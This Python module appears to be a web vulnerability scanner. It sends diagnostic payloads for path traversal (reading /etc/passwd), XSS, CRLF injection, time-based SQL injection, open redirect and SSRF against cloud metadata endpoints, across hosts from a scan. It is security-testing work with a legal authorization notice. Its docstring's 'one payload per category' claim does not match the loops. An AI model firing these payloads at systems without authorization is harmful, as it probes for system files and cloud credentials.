"""Active web fuzzing — controlled probes for common web app vulns.

CONTROLLED means:
  - Each test sends ONE payload per endpoint per category
  - Payloads are diagnostic (look for reflection / time delta / specific error)
  - No automated exploitation
  - Always opt-in via explicit flag

What we test:
  - Path traversal (`../../../etc/passwd`) — content match
  - Open redirect (`?next=external.com`) — Location header match
  - CRLF injection (`%0d%0aX-Injected: 1`) — response header match
  - Reflected XSS (`<svg onload=alert(1)>`) — body reflection match
  - Time-based blind SQLi (`' OR SLEEP(5)--`) — response time delta
  - Server-Side Request Forgery hint (`?url=http://169.254.169.254/`)

LEGAL: Use only on systems you own or have written authorization to test.
"""

from __future__ import annotations

import logging
import re
import socket
import ssl
import time
import urllib.parse
from typing import Optional

log = logging.getLogger(__name__)


def _http_request(host: str, port: int, method: str, path: str, *,
                   tls: bool = False, body: Optional[bytes] = None,
                   headers: Optional[dict] = None,
                   timeout: float = 8.0) -> Optional[tuple[int, dict, bytes, float]]:
    """Send a single HTTP request, return (status, headers, body, elapsed_s)."""
    t0 = time.perf_counter()
    try:
        sock = socket.create_connection((host, port), timeout=timeout)
        if tls:
            ctx = ssl._create_unverified_context()
            sock = ctx.wrap_socket(sock, server_hostname=host)
        hlines = [f"{method} {path} HTTP/1.0",
                  f"Host: {host}",
                  "User-Agent: explotica-fuzz/0.1",
                  "Connection: close"]
        if body:
            hlines.append(f"Content-Length: {len(body)}")
        for k, v in (headers or {}).items():
            hlines.append(f"{k}: {v}")
        req = ("\r\n".join(hlines) + "\r\n\r\n").encode()
        if body:
            req += body
        sock.sendall(req)
        chunks: list[bytes] = []
        while True:
            try:
                ch = sock.recv(8192)
            except (socket.timeout, OSError, ssl.SSLError):
                break
            if not ch:
                break
            chunks.append(ch)
            if sum(len(c) for c in chunks) > 32768:
                break
        sock.close()
    except (socket.timeout, OSError, ssl.SSLError):
        return None
    data = b"".join(chunks)
    elapsed = time.perf_counter() - t0
    if not data:
        return None
    sep = b"\r\n\r\n"
    if sep not in data:
        return None
    head, body_out = data.split(sep, 1)
    head_text = head.decode("utf-8", errors="replace")
    lines = head_text.split("\r\n")
    try:
        status = int(lines[0].split(" ")[1])
    except (IndexError, ValueError):
        status = 0
    hdrs: dict[str, str] = {}
    for line in lines[1:]:
        if ":" in line:
            k, v = line.split(":", 1)
            hdrs[k.strip()] = v.strip()
    return (status, hdrs, body_out, elapsed)


# ── Path traversal ────────────────────────────────────────────────────────
PATH_TRAVERSAL_PAYLOADS = [
    "../../../../etc/passwd",
    "..%2f..%2f..%2f..%2fetc%2fpasswd",
    "....//....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
]


def fuzz_path_traversal(host: str, port: int, *,
                        tls: bool = False, base_paths: Optional[list[str]] = None,
                        timeout: float = 4.0) -> list[dict]:
    """Test path traversal against the given base paths."""
    base_paths = base_paths or ["/", "/api/", "/files/", "/download/"]
    findings: list[dict] = []
    for base in base_paths:
        for payload in PATH_TRAVERSAL_PAYLOADS:
            full = base.rstrip("/") + "/" + payload
            r = _http_request(host, port, "GET", full, tls=tls, timeout=timeout)
            if r is None:
                continue
            _, _, body, _ = r
            if b"root:" in body and b"/bin/" in body:
                findings.append({
                    "vuln": "Path Traversal",
                    "severity": "CRITICAL",
                    "endpoint": full,
                    "evidence": "/etc/passwd content returned",
                })
                break  # first hit per base path is enough
    return findings


# ── Open redirect ─────────────────────────────────────────────────────────
def fuzz_open_redirect(host: str, port: int, *,
                       tls: bool = False, timeout: float = 4.0) -> list[dict]:
    """Test common redirect-parameter patterns."""
    canary = "http://explotica-canary.example.com/"
    params = ["next", "url", "redirect", "redirect_uri", "return",
              "returnUrl", "continue", "dest", "destination", "to",
              "target", "rurl", "ReturnUrl"]
    findings: list[dict] = []
    for param in params:
        path = f"/?{param}={urllib.parse.quote(canary)}"
        r = _http_request(host, port, "GET", path, tls=tls, timeout=timeout)
        if r is None:
            continue
        status, hdrs, _, _ = r
        loc = hdrs.get("Location") or hdrs.get("location") or ""
        if status in (301, 302, 303, 307, 308) and canary in loc:
            findings.append({
                "vuln": "Open Redirect",
                "severity": "MEDIUM",
                "param": param,
                "evidence": f"Location: {loc[:120]}",
            })
            break
    return findings


# ── CRLF injection ────────────────────────────────────────────────────────
def fuzz_crlf_injection(host: str, port: int, *,
                        tls: bool = False, timeout: float = 4.0) -> list[dict]:
    """Test CRLF injection in user-controlled headers."""
    canary_header = "X-Explotica-Injected"
    payload = urllib.parse.quote(f"\r\n{canary_header}: 1")
    findings: list[dict] = []
    params = ["q", "name", "lang", "redirect", "page"]
    for param in params:
        path = f"/?{param}=test{payload}"
        r = _http_request(host, port, "GET", path, tls=tls, timeout=timeout)
        if r is None:
            continue
        _, hdrs, _, _ = r
        if any(k.lower() == canary_header.lower() for k in hdrs):
            findings.append({
                "vuln": "CRLF Injection / HTTP Response Splitting",
                "severity": "HIGH",
                "param": param,
                "evidence": "Server reflected injected header in response",
            })
            break
    return findings


# ── XSS reflection ────────────────────────────────────────────────────────
XSS_PAYLOADS = [
    "<svg onload=alert(1)>",
    "\"><script>alert(1)</script>",
    "javascript:alert(1)",
    "'><img src=x onerror=alert(1)>",
]


def fuzz_xss_reflection(host: str, port: int, *,
                         tls: bool = False, timeout: float = 4.0) -> list[dict]:
    """Test reflected XSS in common query parameters."""
    params = ["q", "search", "name", "query", "s", "keyword", "page", "id"]
    findings: list[dict] = []
    for param in params:
        for payload in XSS_PAYLOADS:
            path = f"/?{param}={urllib.parse.quote(payload)}"
            r = _http_request(host, port, "GET", path, tls=tls, timeout=timeout)
            if r is None:
                continue
            _, _, body, _ = r
            # Look for unescaped payload reflection (case-sensitive)
            if payload.encode() in body:
                findings.append({
                    "vuln": "Reflected XSS",
                    "severity": "HIGH",
                    "param": param,
                    "payload": payload[:60],
                    "evidence": "Payload reflected in response body without encoding",
                })
                return findings  # one finding is sufficient
    return findings


# ── Time-based blind SQLi ────────────────────────────────────────────────
def fuzz_sqli_time_based(host: str, port: int, *,
                          tls: bool = False, timeout: float = 12.0,
                          delay_s: int = 5) -> list[dict]:
    """Test time-based blind SQLi by injecting a SLEEP/WAITFOR delay."""
    payloads = [
        f"' AND SLEEP({delay_s})--",
        f"' OR SLEEP({delay_s})--",
        f"';WAITFOR DELAY '0:0:{delay_s}'--",
    ]
    params = ["id", "user", "search", "page", "q"]
    findings: list[dict] = []

    # First baseline a normal request to measure expected timing
    baseline = _http_request(host, port, "GET", "/?id=1", tls=tls, timeout=4.0)
    if baseline is None:
        return findings
    baseline_time = baseline[3]

    for param in params:
        for payload in payloads:
            path = f"/?{param}={urllib.parse.quote('1' + payload)}"
            r = _http_request(host, port, "GET", path, tls=tls, timeout=timeout)
            if r is None:
                continue
            _, _, _, elapsed = r
            # If response took >= delay_s + baseline + 1s, SQLi is confirmed
            if elapsed >= (baseline_time + delay_s - 0.5):
                findings.append({
                    "vuln": "Time-Based Blind SQLi",
                    "severity": "CRITICAL",
                    "param": param,
                    "payload": payload[:60],
                    "evidence": (f"Response delayed {elapsed:.1f}s vs baseline "
                                  f"{baseline_time:.1f}s with SLEEP({delay_s})"),
                })
                return findings
    return findings


# ── SSRF hint ─────────────────────────────────────────────────────────────
def fuzz_ssrf_hint(host: str, port: int, *,
                    tls: bool = False, timeout: float = 4.0) -> list[dict]:
    """Test SSRF via URL parameters pointing to cloud metadata services.

    Without a callback infrastructure we can't CONFIRM exploitation —
    this is a HINT-level finding for manual follow-up.
    """
    canary_targets = [
        "http://169.254.169.254/latest/meta-data/",   # AWS IMDS
        "http://metadata.google.internal/computeMetadata/v1/",  # GCP
        "http://169.254.169.254/metadata/instance",   # Azure
    ]
    params = ["url", "uri", "src", "next", "redirect", "callback",
              "feed", "endpoint", "import", "fetch"]
    findings: list[dict] = []
    for param in params:
        for target in canary_targets:
            path = f"/?{param}={urllib.parse.quote(target)}"
            r = _http_request(host, port, "GET", path, tls=tls, timeout=timeout)
            if r is None:
                continue
            _, _, body, _ = r
            # Look for metadata-service response signatures
            if (b"ami-id" in body or b"instance-id" in body
                    or b"computeMetadata" in body
                    or b"\"compute\"" in body):
                findings.append({
                    "vuln": "SSRF -> Cloud Metadata",
                    "severity": "CRITICAL",
                    "param": param,
                    "target": target,
                    "evidence": "Server returned cloud metadata content",
                })
                return findings
    return findings


# ── Aggregate ────────────────────────────────────────────────────────────
def fuzz_endpoint(host: str, port: int, *, tls: bool = False,
                   include_sqli_time: bool = False,
                   timeout: float = 4.0) -> list[dict]:
    """Run all fuzz tests against one HTTP endpoint.

    Note: time-based SQLi is opt-in due to its 5+ second delay per param.
    """
    findings: list[dict] = []
    for fn in (fuzz_path_traversal, fuzz_open_redirect,
                fuzz_crlf_injection, fuzz_xss_reflection,
                fuzz_ssrf_hint):
        try:
            r = fn(host, port, tls=tls, timeout=timeout)
            findings.extend(r)
        except Exception as e:
            log.debug("fuzz %s on %s:%d failed: %s",
                      fn.__name__, host, port, e)
    if include_sqli_time:
        try:
            r = fuzz_sqli_time_based(host, port, tls=tls)
            findings.extend(r)
        except Exception as e:
            log.debug("sqli-time on %s:%d failed: %s", host, port, e)
    return findings


def fuzz_scan(scan_dict: dict, *, include_sqli_time: bool = False
              ) -> dict[str, list[dict]]:
    """Run web fuzzing on every HTTP/HTTPS port in a scan."""
    from concurrent.futures import ThreadPoolExecutor, as_completed
    out: dict[str, list[dict]] = {}
    HTTP_PORTS = {80, 81, 8000, 8008, 8080, 8081, 3000, 5000, 8888}
    HTTPS_PORTS = {443, 4443, 8443}

    def work(h):
        ip = h["ip"]
        ports_to_fuzz = []
        for p in h.get("ports", []):
            if p["number"] in HTTP_PORTS or p["number"] in HTTPS_PORTS:
                ports_to_fuzz.append((p["number"], p["number"] in HTTPS_PORTS))
        all_findings: list[dict] = []
        for port, tls in ports_to_fuzz:
            fs = fuzz_endpoint(ip, port, tls=tls,
                                include_sqli_time=include_sqli_time)
            for f in fs:
                f["port"] = port
                all_findings.append(f)
        return (ip, all_findings)

    with ThreadPoolExecutor(max_workers=8) as pool:
        for f in as_completed([pool.submit(work, h)
                                for h in scan_dict.get("hosts", [])]):
            try:
                ip, findings = f.result()
                if findings:
                    out[ip] = findings
            except Exception as e:
                log.debug("fuzz worker: %s", e)
    return out
